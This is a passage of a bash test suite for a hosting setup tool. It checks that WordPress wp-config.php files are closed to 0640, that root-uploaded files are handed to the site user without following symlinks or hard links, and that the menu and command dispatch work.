  assert_eq  "nothing is downloaded for it"        "" "$(cat "$_wp_curl")"
  rm -f "$_wp_d/wp-config.php"

  # what root uploaded: the numbers now say none of it is the site's. fix-owner runs first, and
  # the chown here changes nothing, so the hand-over cannot finish and the run stops there.
  _wp_bin="$TMP/wp-bin"; mkdir -p "$_wp_bin"
  cat >"$_wp_bin/chown" <<EOF
#!/bin/sh
printf 'chown %s\n' "\$1 \$2 \$3" >>"${_wp_chown}"
EOF
  chmod 0755 "$_wp_bin/chown"
  DOM_FIX_OWNER_PATH="${_wp_bin}:/usr/bin:/bin"
  DOM_HARDLINKS_SYSCTL="$TMP/wp-hardlinks"; printf '1\n' >"$DOM_HARDLINKS_SYSCTL"
  DOM_MOUNTINFO="$TMP/wp-mountinfo"; : >"$DOM_MOUNTINFO"
  _wp_ids="$(( _wp_u + 1 )) ${_wp_g}"; : >"$_wp_curl"; : >"$_wp_chown"
  assert_eq  "files that are someone else's are handed over first, and a hand-over that fails stops the run" 1 "$(_wpf wp1.example.com)"
  _wp_o="$(cat "$_wp_out")"
  assert_has "it says that fix-owner runs"         "'fix-owner wp1.example.com' runs first" "$_wp_o"
  assert_has "chown ran, for the site's user"      "chown -h -- wp1_example_com:wp1_example_com" "$(cat "$_wp_chown")"
  assert_has "and why the run stopped"             "could not all be handed to wp1_example_com" "$_wp_o"
  assert_eq  "before anything is downloaded"       "" "$(cat "$_wp_curl")"
  printf '0\n' >"$DOM_HARDLINKS_SYSCTL"; : >"$_wp_chown"
  assert_eq  "without protected hard links nothing is handed over" 1 "$(_wpf wp1.example.com)"
  assert_has "which is said"                       "fs.protected_hardlinks is off" "$(cat "$_wp_out")"
  assert_eq  "and chown never runs"                "" "$(cat "$_wp_chown")"
  # asked about even where nothing would be replaced: a site that holds lomp's page alone
  _wp_site wp2.example.com php
  printf '<body><p>This site was %s.</p></body>\n' "$DOMAIN_PLACEHOLDER_MARK" >"$SITES_ROOT/wp2.example.com/public_html/index.html"
  OPT_YES=0; printf '1\n' >"$DOM_HARDLINKS_SYSCTL"
  assert_eq  "the hand-over is asked about as well" 1 "$(_wpf wp2.example.com)"
  assert_has "and no answer is a no"               "not confirmed" "$(cat "$_wp_out")"
  assert_eq  "so nothing is handed over"           "" "$(cat "$_wp_chown")"
  OPT_YES=1
else
  printf '   (unzip is not installed here: the runs that unpack the archive were skipped)\n'
fi

# WordPress's installer writes its wp-config.php 0666, in a site this command set up and in one
# somebody uploaded alike. The check cron runs every minute closes the one in the document root
# of every PHP and WordPress site to 0640, as the site's user, where the file is that user's.
_wp_ids="${_wp_u} ${_wp_g}"
_wp_site wp3.example.com php
_wp_c="$SITES_ROOT/wp3.example.com/public_html/wp-config.php"
_wp_pass() { run_isolated lib_domain_wp_config_close; }
_wp_mode() { stat -c %a "$_wp_c"; }
: >"$RUNUSER_LOG"
assert_eq  "a pass over sites that have no wp-config.php exits 0" 0 "$(_wp_pass)"
assert_eq  "and runs nothing"                    "" "$(cat "$RUNUSER_LOG")"
if (( CAN_CHMOD )); then
  printf '<?php // written by the installer\n' >"$_wp_c"; chmod 0666 "$_wp_c"
  OPT_DRY_RUN=1
  assert_eq  "a dry run closes nothing"            "0 666" "$(_wp_pass) $(_wp_mode)"
  OPT_DRY_RUN=0
  assert_eq  "the wp-config.php the installer left 0666 is closed to 0640" "0 640" "$(_wp_pass) $(_wp_mode)"
  assert_has "by the site's user"                  "-u wp3_example_com -- env -C / chmod 0640 " "$(cat "$RUNUSER_LOG")"
  assert_has "and the log says so"                 "wp-config.php of wp3.example.com closed to 0640 (it was 666)" "$(cat "$LOG_FILE")"
  : >"$RUNUSER_LOG"
  assert_eq  "a pass that finds it closed exits 0" 0 "$(_wp_pass)"
  assert_eq  "and runs nothing"                    "" "$(cat "$RUNUSER_LOG")"
  chmod 0666 "$_wp_c"   # the installer's own chmod, landing after a pass
  assert_eq  "opened again, it is closed again"    "0 640" "$(_wp_pass) $(_wp_mode)"
  chmod 0644 "$_wp_c"
  assert_eq  "one that others can only read is closed as well" "0 640" "$(_wp_pass) $(_wp_mode)"
  : >"$RUNUSER_LOG"
  for _m in 600 400 440; do
    chmod "0${_m}" "$_wp_c"
    assert_eq "a file closed further (0${_m}) is not opened up" "0 ${_m}" "$(_wp_pass) $(_wp_mode)"
  done
  assert_eq  "nothing is run for those"            "" "$(cat "$RUNUSER_LOG")"
  # A file root uploaded: closed as root's, PHP could no longer read it, so it is handed to the
  # site first, the way fix-owner hands a file over. The suite cannot own a file as root:
  # "root" is whoever runs it here and the site somebody else, and the chown on find's PATH
  # only records how it was called - so the file stays "root's", and is not closed as such.
  _wp_saved2="$(declare -p DOM_FIX_OWNER_PATH DOM_HARDLINKS_SYSCTL DOM_UPLOADER_UID)"
  _wp_bin2="$TMP/wp-bin2"; mkdir -p "$_wp_bin2"
  cat >"$_wp_bin2/chown" <<EOF
#!/bin/sh
printf 'chown %s in %s\n' "\$*" "\$(pwd -P)" >>"${_wp_chown}"
EOF
  chmod 0755 "$_wp_bin2/chown"
  DOM_FIX_OWNER_PATH="${_wp_bin2}:/usr/bin:/bin"; DOM_UPLOADER_UID="$_wp_u"
  DOM_HARDLINKS_SYSCTL="$TMP/wp-hardlinks2"; printf '1\n' >"$DOM_HARDLINKS_SYSCTL"
  _wp_ids="$(( _wp_u + 1 )) ${_wp_g}"; _wp_dr="$(cd "$SITES_ROOT/wp3.example.com/public_html" && pwd -P)"
  chmod 0666 "$_wp_c"; : >"$_wp_chown"; : >"$RUNUSER_LOG"
  assert_eq  "a pass over a wp-config.php root uploaded exits 0" 0 "$(_wp_pass)"
  assert_eq  "it goes to the site by a chown that follows no link, run inside the document root on the bare name" \
    "chown -h -- wp3_example_com:wp3_example_com ./wp-config.php in ${_wp_dr}" "$(cat "$_wp_chown")"
  assert_eq  "and while it is still root's it is not closed" "666 " "$(_wp_mode) $(cat "$RUNUSER_LOG")"
  : >"$_wp_chown"; chmod 0640 "$_wp_c"
  assert_eq  "a file of root's that is closed already stays root's" "0 " "$(_wp_pass) $(cat "$_wp_chown")"
  chmod 0644 "$_wp_c"; printf '0\n' >"$DOM_HARDLINKS_SYSCTL"
  assert_eq  "without protected hard links nothing changes hands" "0 " "$(_wp_pass) $(cat "$_wp_chown")"
  printf '1\n' >"$DOM_HARDLINKS_SYSCTL"
  if ln "$_wp_c" "$TMP/wp-second-name" 2>/dev/null && [[ "$(stat -c %h "$_wp_c")" == 2 ]]; then
    assert_eq "a file that has a second name is not taken for an upload" "0 " "$(_wp_pass) $(cat "$_wp_chown")"
  fi
  rm -f "$TMP/wp-second-name"
  if (( CAN_SYMLINK )); then
    # the document root replaced by a link to a directory that holds a file of root's
    mkdir -p "$TMP/wp-rootdir"; mv "$_wp_c" "$TMP/wp-rootdir/wp-config.php"
    mv "$SITES_ROOT/wp3.example.com/public_html" "$TMP/wp3-docroot"; ln -s "$TMP/wp-rootdir" "$SITES_ROOT/wp3.example.com/public_html"
    assert_eq "a link in place of the document root is not entered" "0 644 " "$(_wp_pass) $(stat -c %a "$TMP/wp-rootdir/wp-config.php") $(cat "$_wp_chown")"
    rm -f "$SITES_ROOT/wp3.example.com/public_html"; mv "$TMP/wp3-docroot" "$SITES_ROOT/wp3.example.com/public_html"
    mv "$TMP/wp-rootdir/wp-config.php" "$_wp_c"
  fi
  DOM_UPLOADER_UID="$(( _wp_u + 2 ))"
  assert_eq  "the file of a third account is nobody's to hand over" "0 644 " "$(_wp_pass) $(_wp_mode) $(cat "$_wp_chown")"
  eval "$_wp_saved2"
  _wp_ids="its user wp3_example_com does not exist"
  eval '_domain_fix_owner_ids() { printf "%s" "$_wp_ids"; [[ "$_wp_ids" == [0-9]* ]]; }'
  chmod 0666 "$_wp_c"; : >"$RUNUSER_LOG"
  assert_eq  "the file of a site whose account is not a site's is left as it is" "0 666" "$(_wp_pass) $(_wp_mode)"
  assert_eq  "with nothing run for it"             "" "$(cat "$RUNUSER_LOG")"
  _wp_ids="${_wp_u} ${_wp_g}"
  # as root, for real: the upload changes hands and is closed, and a file root keeps elsewhere -
  # behind a link, or under a second name - stays root's
  if (( EUID == 0 )) && [[ "${OSTYPE:-}" != msys* && "${OSTYPE:-}" != cygwin* ]] && id -u nobody >/dev/null 2>&1 \
     && [[ "$(cat /proc/sys/fs/protected_hardlinks 2>/dev/null || true)" == 1 ]]; then
    lib_domain_state_reset
    D_DOMAIN="wp4.example.com"; D_IDENT="wp4_example_com"; D_USER="nobody"; D_GROUP="$(id -gn nobody)"
    D_HOME="$SITES_ROOT/wp4.example.com"; D_MODE="php"; D_STATUS="active"
    lib_domain_state_save
    mkdir -p "$D_HOME/public_html"; _wp_r="$D_HOME/public_html/wp-config.php"; _wp_v="$TMP/wp-victim"
    printf '<?php // uploaded as root\n' >"$_wp_r"; chmod 0644 "$_wp_r"
    printf 'a file root keeps\n' >"$_wp_v"; chmod 0644 "$_wp_v"
    _wp_ids="$(id -u nobody) $(id -g nobody)"
    DOM_FIX_OWNER_PATH="/usr/sbin:/usr/bin:/sbin:/bin"; DOM_HARDLINKS_SYSCTL="/proc/sys/fs/protected_hardlinks"
    assert_eq  "as root: a wp-config.php root uploaded is the site's and 0640 after one pass" "0 640 nobody:${D_GROUP}" "$(_wp_pass) $(stat -c '%a %U:%G' "$_wp_r")"
    assert_has "and the log says whose it was" "wp-config.php of wp4.example.com handed to nobody:${D_GROUP} (root had uploaded it)" "$(cat "$LOG_FILE")"
    rm -f "$_wp_r"; ln -s "$_wp_v" "$_wp_r"
    assert_eq  "a link to a file root keeps elsewhere changes nothing there" "0 644 root" "$(_wp_pass) $(stat -c '%a %U' "$_wp_v")"
    rm -f "$_wp_r"; ln "$_wp_v" "$_wp_r"
    assert_eq  "nor does a second name of it" "0 644 root" "$(_wp_pass) $(stat -c '%a %U' "$_wp_v")"
    rm -rf "$D_HOME" "$_wp_v" "$STATE_DIR/domains/wp4.example.com"
    eval "$_wp_saved2"; _wp_ids="${_wp_u} ${_wp_g}"
    lib_domain_state_reset
  fi
  # only where PHP runs
  for _m in static proxy; do
    lib_json_set "$(lib_domain_json wp3.example.com)" '.mode = $m' --arg m "$_m"
    assert_eq "a wp-config.php in a ${_m} site is not looked at" "0 666" "$(_wp_pass) $(_wp_mode)"
  done
  lib_json_set "$(lib_domain_json wp3.example.com)" '.mode = "wordpress"'
  assert_eq  "one in a site added with --wordpress is" "0 640" "$(_wp_pass) $(_wp_mode)"
  lib_json_set "$(lib_domain_json wp3.example.com)" '.mode = "php"'
  # every site in one pass, whichever way WordPress got there
  chmod 0666 "$_wp_c"; printf '<?php // uploaded\n' >"$_wp_d/wp-config.php"; chmod 0666 "$_wp_d/wp-config.php"
  assert_eq  "every site's is closed in the same pass" "0 640 640" "$(_wp_pass) $(_wp_mode) $(stat -c %a "$_wp_d/wp-config.php")"
  rm -f "$_wp_d/wp-config.php"
  # a chmod that fails is tried again in a minute: said every time, it would fill the log
  chmod 0666 "$_wp_c"
  _wp_r="$( ( eval 'lib_domain_as_user() { return 1; }'; OPT_QUIET=0; lib_domain_wp_config_close; printf 'rc=%s' "$?" ) 2>&1 )"
  assert_eq  "a chmod that fails is not reported, and the pass still exits 0" "rc=0" "$_wp_r"
  # the minute check is what runs it, and not while another command holds the lock
  ( eval 'flock() { return 1; }; lib_ols_htaccess_pending() { return 0; }'; lib_ols_htaccess_check_main ) >/dev/null 2>&1 || true
  assert_eq  "the minute check leaves it while another command holds the lock" "666" "$(_wp_mode)"
  ( eval 'flock() { return 0; }; lib_ols_htaccess_pending() { return 0; }'; lib_ols_htaccess_check_main ) >/dev/null 2>&1 || true
  assert_eq  "and closes it otherwise"             "640" "$(_wp_mode)"
  if (( CAN_SYMLINK )); then
    rm -f "$_wp_c"; printf 'elsewhere\n' >"$TMP/wp-elsewhere"; chmod 0666 "$TMP/wp-elsewhere"; ln -s "$TMP/wp-elsewhere" "$_wp_c"
    assert_eq  "a wp-config.php that is a link is not followed" "0 666" "$(_wp_pass) $(stat -c %a "$TMP/wp-elsewhere")"
    rm -f "$_wp_c"
  fi
fi
mv "$STATE_DIR/domains/wp3.example.com/domain.json" "$TMP/wp3-domain.json"; : >"$STATE_DIR/domains/wp3.example.com/domain.json"
assert_eq  "a site whose state cannot be read is passed over" 0 "$(_wp_pass)"
mv "$TMP/wp3-domain.json" "$STATE_DIR/domains/wp3.example.com/domain.json"

# the menu: item 25, for a site PHP runs in
_mwp() {   # -> the command the menu runs
  (
    eval '_menu_run() { printf "%s\n" "$*"; }
          _menu_pick_domain() { printf "picked.example.com"; }
          _menu_pause() { :; }'
    _menu_wordpress 2>/dev/null | tail -n 1
  )
}
assert_eq  "the menu runs it for the site that was picked" "wordpress picked.example.com" "$(_mwp)"
assert_has "and offers only the sites PHP runs in"  '_menu_pick_domain php' "$(declare -f _menu_wordpress)"
for _c in "php|php" "wp|wordpress" "static|static" "node|proxy"; do
  mkdir -p "$TMP/wp-state2/domains/${_c%%|*}.example.com"
  printf '{"mode":"%s"}\n' "${_c##*|}" >"$TMP/wp-state2/domains/${_c%%|*}.example.com/domain.json"
done
mkdir -p "$TMP/wp-state2/domains/plain.example.com"; printf '{}\n' >"$TMP/wp-state2/domains/plain.example.com/domain.json"
assert_eq  "which leaves static and proxy sites out" "php.example.com plain.example.com wp.example.com " \
  "$(STATE_DIR="$TMP/wp-state2"; _menu_domains php | tr '\n' ' ')"
assert_eq  "every other entry still offers every site" "node.example.com php.example.com plain.example.com static.example.com wp.example.com " \
  "$(STATE_DIR="$TMP/wp-state2"; _menu_domains | tr '\n' ' ')"
assert_has "the question lists what that gives"  '_menu_domains "$only"' "$(declare -f _menu_pick_domain)"
_menu_block="$(awk '/_menu_group "SITES"/{f=1} f{print} f && /^[[:space:]]*esac/{exit}' "$ROOT/lib/menu.sh")"
assert_has "it is item 25 of the main menu"      '_menu_item 25 "Download WordPress into a site (you finish the setup in the browser)"' "$_menu_block"
assert_has "which opens it"                      '25) _menu_wordpress ;;' "$_menu_block"
assert_has "the command is dispatched"           'wordpress)      lib_domain_wordpress_main "${rest[@]}" ;;' "$(cat "$ROOT/setup.sh")"
assert_has "and in the command reference"        "wordpress <domain>" "$(lib_usage)"

eval "$_wp_saved"; eval "$_wp_orig_ids"; eval "$_wp_orig_list"; eval "$_wp_orig_apt"
unset -f curl _wpf _wp_site _mwp _wp_pass _wp_mode
rm -rf "$_wp_h" "$SITES_ROOT/wps.example.com" "$SITES_ROOT/wp2.example.com" "$SITES_ROOT/wp3.example.com"
lib_domain_state_reset

printf '\n%d passed, %d failed\n' "$PASS" "$FAIL"
if (( FAIL > 0 )); then exit 1; fi
exit 0
